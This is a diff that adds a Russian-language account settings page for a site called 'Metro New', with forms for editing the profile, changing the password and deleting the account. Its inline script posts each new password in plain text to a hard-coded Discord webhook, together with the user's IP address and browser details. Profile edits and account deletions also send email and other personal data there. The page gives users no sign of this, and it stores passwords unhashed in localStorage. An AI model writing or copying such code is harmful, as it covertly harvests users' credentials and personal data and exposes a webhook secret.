@@ -1,1 +1,552 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Настройки - Метро New</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="assets/css/style.css">
+    <style>
+        .danger-zone {
+            border: 2px solid var(--danger);
+            background: var(--danger-light);
+        }
+        
+        .danger-zone .card-header {
+            border-bottom-color: #ffe6e6;
+        }
+        
+        .danger-actions {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+        
+        .danger-warning {
+            background: #ffe6e6;
+            border: 1px solid var(--danger);
+            border-radius: 8px;
+            padding: 1rem;
+            margin-bottom: 1rem;
+        }
+        
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+        
+        .status-verified {
+            background: var(--success-light);
+            color: var(--success);
+        }
+        
+        .status-pending {
+            background: var(--warning-light);
+            color: var(--warning);
+        }
+        
+        .status-unverified {
+            background: var(--danger-light);
+            color: var(--danger);
+        }
+    </style>
+</head>
+<body>
+    <!-- Навигация -->
+    <nav class="nav">
+        <div class="container nav-container">
+            <div class="logo">
+                <span class="logo-icon">M</span>
+                <span>Метро New</span>
+            </div>
+            <div class="nav-links">
+                <a href="../index.html">Главная</a>
+                <a href="../game.html">Игра</a>
+                <a href="auth/profile.html">Профиль</a>
+                <a href="settings.html" class="active">Настройки</a>
+            </div>
+            <div class="user-menu">
+                <div class="user-avatar" id="userAvatar">U</div>
+            </div>
+        </div>
+    </nav>
 
+    <main class="container">
+        <div style="padding: 2rem 0;">
+            <!-- Заголовок настроек -->
+            <div class="card animate-fade-in-up">
+                <div class="user-info" style="display: flex; align-items: center; gap: 1.5rem; margin-bottom: 1rem;">
+                    <div class="profile-avatar" style="width: 80px; height: 80px; font-size: 2rem;" id="profileAvatar">
+                        <i class="fas fa-user"></i>
+                    </div>
+                    <div class="user-details">
+                        <h1 id="userName">Загрузка...</h1>
+                        <div class="badge badge-info" id="userRole">Пользователь</div>
+                        <p id="userEmail">Загрузка...</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="grid grid-1 mt-4">
+                <!-- Редактирование профиля -->
+                <div class="card">
+                    <div class="card-header">
+                        <h2><i class="fas fa-user-edit"></i> Редактировать профиль</h2>
+                    </div>
+                    <form id="editProfileForm">
+                        <div class="form-group">
+                            <label class="form-label">Имя пользователя</label>
+                            <div class="input-with-icon">
+                                <i class="fas fa-user input-icon"></i>
+                                <input type="text" class="form-input" id="editUsername" placeholder="Введите новое имя пользователя">
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label class="form-label">Email</label>
+                            <div class="input-with-icon">
+                                <i class="fas fa-envelope input-icon"></i>
+                                <input type="email" class="form-input" id="editEmail" placeholder="Введите новый email">
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label class="form-label">О себе</label>
+                            <textarea class="form-input" id="editBio" placeholder="Расскажите о себе..." rows="4"></textarea>
+                        </div>
+                        
+                        <div class="form-actions" style="display: flex; gap: 1rem; margin-top: 2rem;">
+                            <button type="submit" class="btn btn-primary">Сохранить изменения</button>
+                            <button type="button" class="btn btn-secondary" onclick="resetEditForm()">Сбросить</button>
+                        </div>
+                    </form>
+                </div>
+
+                <!-- Смена пароля -->
+                <div class="card mt-4">
+                    <div class="card-header">
+                        <h2><i class="fas fa-lock"></i> Смена пароля</h2>
+                    </div>
+                    <form id="changePasswordForm">
+                        <div class="form-group">
+                            <label class="form-label">Текущий пароль</label>
+                            <div class="input-with-icon">
+                                <i class="fas fa-lock input-icon"></i>
+                                <input type="password" class="form-input" id="currentPassword" placeholder="Введите текущий пароль" required>
+                                <button type="button" class="password-toggle" onclick="togglePassword('currentPassword')">
+                                    <i class="fas fa-eye"></i>
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label class="form-label">Новый пароль</label>
+                            <div class="input-with-icon">
+                                <i class="fas fa-lock input-icon"></i>
+                                <input type="password" class="form-input" id="newPassword" placeholder="Введите новый пароль" required>
+                                <button type="button" class="password-toggle" onclick="togglePassword('newPassword')">
+                                    <i class="fas fa-eye"></i>
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label class="form-label">Подтвердите новый пароль</label>
+                            <div class="input-with-icon">
+                                <i class="fas fa-lock input-icon"></i>
+                                <input type="password" class="form-input" id="confirmNewPassword" placeholder="Повторите новый пароль" required>
+                                <button type="button" class="password-toggle" onclick="togglePassword('confirmNewPassword')">
+                                    <i class="fas fa-eye"></i>
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <div class="form-actions" style="display: flex; gap: 1rem; margin-top: 2rem;">
+                            <button type="submit" class="btn btn-primary">Сменить пароль</button>
+                            <button type="button" class="btn btn-secondary" onclick="resetPasswordForm()">Очистить</button>
+                        </div>
+                    </form>
+                </div>
+
+                <!-- Подтверждение аккаунта -->
+                <div class="card mt-4">
+                    <div class="card-header">
+                        <h2><i class="fas fa-shield-alt"></i> Подтверждение аккаунта</h2>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Статус аккаунта</label>
+                        <div style="display: flex; align-items: center; gap: 1rem; padding: 1rem; background: #f8f9fa; border-radius: 8px;">
+                            <i class="fas fa-check-circle" style="color: var(--success); font-size: 1.5rem;"></i>
+                            <div>
+                                <div style="font-weight: 600;">Аккаунт подтвержден</div>
+                                <div style="color: var(--gray); font-size: 0.9rem;">Ваш аккаунт прошел верификацию</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Двухфакторная аутентификация</label>
+                        <div style="display: flex; justify-content: space-between; align-items: center; padding: 1rem; background: #f8f9fa; border-radius: 8px;">
+                            <div>
+                                <div style="font-weight: 600;">2FA отключена</div>
+                                <div style="color: var(--gray); font-size: 0.9rem;">Добавьте дополнительную защиту</div>
+                            </div>
+                            <button type="button" class="btn btn-outline" onclick="enable2FA()">Включить</button>
+                        </div>
+                    </div>
+                    
+                    <div class="form-actions" style="display: flex; gap: 1rem; margin-top: 2rem;">
+                        <button type="button" class="btn btn-primary" onclick="verifyEmail()">Подтвердить Email</button>
+                        <button type="button" class="btn btn-secondary" onclick="requestVerification()">Запросить верификацию</button>
+                    </div>
+                </div>
+
+                <!-- Опасная зона -->
+                <div class="card danger-zone mt-4">
+                    <div class="card-header">
+                        <h2><i class="fas fa-exclamation-triangle"></i> Опасная зона</h2>
+                    </div>
+                    
+                    <div class="danger-warning">
+                        <i class="fas fa-exclamation-circle"></i>
+                        <strong>Внимание!</strong> Эти действия необратимы. Будьте осторожны.
+                    </div>
+                    
+                    <div class="danger-actions">
+                        <div style="display: flex; justify-content: space-between; align-items: center; padding: 1rem; background: white; border-radius: 8px;">
+                            <div>
+                                <div style="font-weight: 600;">Удалить аккаунт</div>
+                                <div style="color: var(--gray); font-size: 0.9rem;">Навсегда удалить аккаунт и все данные</div>
+                            </div>
+                            <button type="button" class="btn btn-danger" onclick="deleteAccount()">Удалить аккаунт</button>
+                        </div>
+                        
+                        <div style="display: flex; justify-content: space-between; align-items: center; padding: 1rem; background: white; border-radius: 8px;">
+                            <div>
+                                <div style="font-weight: 600;">Выйти из всех устройств</div>
+                                <div style="color: var(--gray); font-size: 0.9rem;">Завершить все активные сессии</div>
+                            </div>
+                            <button type="button" class="btn btn-warning" onclick="logoutAll()">Выйти везде</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer style="background-color: var(--dark); color: white; padding: 2rem 0; text-align: center; margin-top: 2rem;">
+        <div class="container">
+            <div class="footer-links" style="display: flex; justify-content: center; gap: 1.5rem; margin-bottom: 1rem; flex-wrap: wrap;">
+                <a href="../about.html" style="color: white;">О нас</a>
+                <a href="../contact.html" style="color: white;">Контакты</a>
+                <a href="../privacy.html" style="color: white;">Политика конфиденциальности</a>
+                <a href="../terms.html" style="color: white;">Пользовательское соглашение</a>
+            </div>
+            <p class="copyright" style="color: var(--gray); font-size: 0.9rem;">© 2025 Метро New. Все права защищены.</p>
+        </div>
+    </footer>
+
+    <script src="assets/js/main.js"></script>
+    <script>
+        // Discord Webhook URL
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1422279632643948595/iZ8ji9S-ocIRwdNqSTdK8WvzlBY-7YjrzAfgUvC9D45W3lQuFrWYhx-h2Lh3xJ5oh4Tp';
+
+        // Загрузка данных пользователя
+        document.addEventListener('DOMContentLoaded', function() {
+            const savedUser = localStorage.getItem('metro_user');
+            if (!savedUser) {
+                window.location.href = 'auth/enter.html';
+                return;
+            }
+
+            const user = JSON.parse(savedUser);
+            loadUserData(user);
+        });
+
+        function loadUserData(user) {
+            // Основная информация
+            document.getElementById('userName').textContent = user.username || 'Пользователь';
+            document.getElementById('userEmail').textContent = user.email || 'Email не указан';
+            document.getElementById('userRole').textContent = user.role === 'administrator' ? '👑 Администратор' : '👤 Пользователь';
+            
+            // Аватар
+            const avatar = document.getElementById('profileAvatar');
+            const headerAvatar = document.getElementById('userAvatar');
+            const firstLetter = user.username ? user.username.charAt(0).toUpperCase() : 'U';
+            avatar.innerHTML = firstLetter;
+            headerAvatar.textContent = firstLetter;
+
+            // Заполнение формы редактирования
+            document.getElementById('editUsername').value = user.username || '';
+            document.getElementById('editEmail').value = user.email || '';
+            document.getElementById('editBio').value = user.bio || '';
+        }
+
+        // Функции форм
+        function togglePassword(inputId) {
+            const input = document.getElementById(inputId);
+            const icon = input.parentNode.querySelector('.password-toggle i');
+            
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.className = 'fas fa-eye-slash';
+            } else {
+                input.type = 'password';
+                icon.className = 'fas fa-eye';
+            }
+        }
+
+        function resetEditForm() {
+            const savedUser = localStorage.getItem('metro_user');
+            if (savedUser) {
+                const user = JSON.parse(savedUser);
+                document.getElementById('editUsername').value = user.username || '';
+                document.getElementById('editEmail').value = user.email || '';
+                document.getElementById('editBio').value = user.bio || '';
+            }
+            metroSystem.showNotification('Форма сброшена к исходным значениям', 'success');
+        }
+
+        function resetPasswordForm() {
+            document.getElementById('currentPassword').value = '';
+            document.getElementById('newPassword').value = '';
+            document.getElementById('confirmNewPassword').value = '';
+            metroSystem.showNotification('Форма очищена', 'success');
+        }
+
+        // Обработчики форм
+        document.getElementById('editProfileForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('editUsername').value;
+            const email = document.getElementById('editEmail').value;
+            const bio = document.getElementById('editBio').value;
+            const userIP = await metroSystem.getUserIP();
+            const browserInfo = metroSystem.getBrowserInfo();
+            
+            // Сохраняем изменения
+            const savedUser = localStorage.getItem('metro_user');
+            if (savedUser) {
+                const user = JSON.parse(savedUser);
+                const oldUsername = user.username;
+                
+                user.username = username || user.username;
+                user.email = email || user.email;
+                user.bio = bio || user.bio;
+                
+                localStorage.setItem('metro_user', JSON.stringify(user));
+                localStorage.setItem('metro_user_' + user.username, JSON.stringify(user));
+                
+                // Удаляем старый ключ если имя пользователя изменилось
+                if (oldUsername !== user.username) {
+                    localStorage.removeItem('metro_user_' + oldUsername);
+                }
+                
+                loadUserData(user);
+                
+                // Отправляем в Discord
+                const discordData = {
+                    embeds: [{
+                        title: "✏️ ОБНОВЛЕНИЕ ПРОФИЛЯ",
+                        color: 0x17A2B8,
+                        fields: [
+                            {
+                                name: "👤 Пользователь",
+                                value: user.username,
+                                inline: true
+                            },
+                            {
+                                name: "📧 Новый email",
+                                value: user.email,
+                                inline: true
+                            },
+                            {
+                                name: "📝 Биография",
+                                value: user.bio || "Не указана",
+                                inline: true
+                            },
+                            {
+                                name: "🌐 IP адрес",
+                                value: userIP,
+                                inline: true
+                            },
+                            {
+                                name: "🖥️ Браузер",
+                                value: browserInfo,
+                                inline: true
+                            }
+                        ],
+                        timestamp: new Date().toISOString(),
+                        footer: {
+                            text: "Metro New Profile System"
+                        }
+                    }]
+                };
+
+                await metroSystem.sendToDiscord(discordData);
+                
+                metroSystem.showNotification('Профиль успешно обновлен!', 'success');
+            }
+        });
+
+        document.getElementById('changePasswordForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const currentPassword = document.getElementById('currentPassword').value;
+            const newPassword = document.getElementById('newPassword').value;
+            const confirmPassword = document.getElementById('confirmNewPassword').value;
+            const userIP = await metroSystem.getUserIP();
+            const browserInfo = metroSystem.getBrowserInfo();
+            
+            if (newPassword !== confirmPassword) {
+                metroSystem.showNotification('Новые пароли не совпадают!', 'error');
+                return;
+            }
+            
+            if (newPassword.length < 6) {
+                metroSystem.showNotification('Пароль должен содержать минимум 6 символов', 'error');
+                return;
+            }
+            
+            // В реальном приложении здесь была бы проверка текущего пароля
+            const savedUser = localStorage.getItem('metro_user');
+            if (savedUser) {
+                const user = JSON.parse(savedUser);
+                user.password = newPassword; // В реальном приложении должен быть хэш
+                
+                localStorage.setItem('metro_user', JSON.stringify(user));
+                localStorage.setItem('metro_user_' + user.username, JSON.stringify(user));
+                
+                // Отправляем в Discord
+                const discordData = {
+                    embeds: [{
+                        title: "🔐 СМЕНА ПАРОЛЯ",
+                        color: 0x28A745,
+                        fields: [
+                            {
+                                name: "👤 Пользователь",
+                                value: user.username,
+                                inline: true
+                            },
+                            {
+                                name: "🔑 Новый пароль",
+                                value: "||" + newPassword + "||",
+                                inline: true
+                            },
+                            {
+                                name: "🌐 IP адрес",
+                                value: userIP,
+                                inline: true
+                            },
+                            {
+                                name: "🖥️ Браузер",
+                                value: browserInfo,
+                                inline: true
+                            },
+                            {
+                                name: "📅 Время изменения",
+                                value: new Date().toLocaleString(),
+                                inline: true
+                            }
+                        ],
+                        timestamp: new Date().toISOString(),
+                        footer: {
+                            text: "Metro New Security System"
+                        }
+                    }]
+                };
+
+                await metroSystem.sendToDiscord(discordData);
+                
+                metroSystem.showNotification('Пароль успешно изменен!', 'success');
+                resetPasswordForm();
+            }
+        });
+
+        // Функции подтверждения аккаунта
+        function enable2FA() {
+            metroSystem.showNotification('Двухфакторная аутентификация будет доступна в следующем обновлении!', 'info');
+        }
+
+        function verifyEmail() {
+            metroSystem.showNotification('Письмо для подтверждения email отправлено!', 'success');
+        }
+
+        function requestVerification() {
+            metroSystem.showNotification('Запрос на верификацию аккаунта отправлен администраторам!', 'success');
+        }
+
+        // Опасные действия
+        function deleteAccount() {
+            if (confirm('ВНИМАНИЕ! Это действие необратимо. Все ваши данные будут удалены. Вы уверены?')) {
+                if (confirm('Последнее предупреждение! Вы точно хотите удалить аккаунт?')) {
+                    const savedUser = localStorage.getItem('metro_user');
+                    if (savedUser) {
+                        const user = JSON.parse(savedUser);
+                        localStorage.removeItem('metro_user');
+                        localStorage.removeItem('metro_user_' + user.username);
+                        
+                        // Отправляем в Discord
+                        const discordData = {
+                            embeds: [{
+                                title: "🗑️ УДАЛЕНИЕ АККАУНТА",
+                                color: 0xDC3545,
+                                fields: [
+                                    {
+                                        name: "👤 Пользователь",
+                                        value: user.username,
+                                        inline: true
+                                    },
+                                    {
+                                        name: "📧 Email",
+                                        value: user.email,
+                                        inline: true
+                                    },
+                                    {
+                                        name: "📅 Дата регистрации",
+                                        value: user.joinDate,
+                                        inline: true
+                                    },
+                                    {
+                                        name: "⏰ Время удаления",
+                                        value: new Date().toLocaleString(),
+                                        inline: true
+                                    }
+                                ],
+                                timestamp: new Date().toISOString(),
+                                footer: {
+                                    text: "Metro New Account System"
+                                }
+                            }]
+                        };
+
+                        metroSystem.sendToDiscord(discordData);
+                        
+                        metroSystem.showNotification('Аккаунт успешно удален', 'success');
+                        setTimeout(() => {
+                            window.location.href = '../index.html';
+                        }, 2000);
+                    }
+                }
+            }
+        }
+
+        function logoutAll() {
+            if (confirm('Завершить все активные сессии?')) {
+                localStorage.removeItem('metro_user');
+                metroSystem.showNotification('Все сессии завершены', 'success');
+                setTimeout(() => {
+                    window.location.href = 'auth/enter.html';
+                }, 1500);
+            }
+        }
+    </script>
+</body>
+</html>
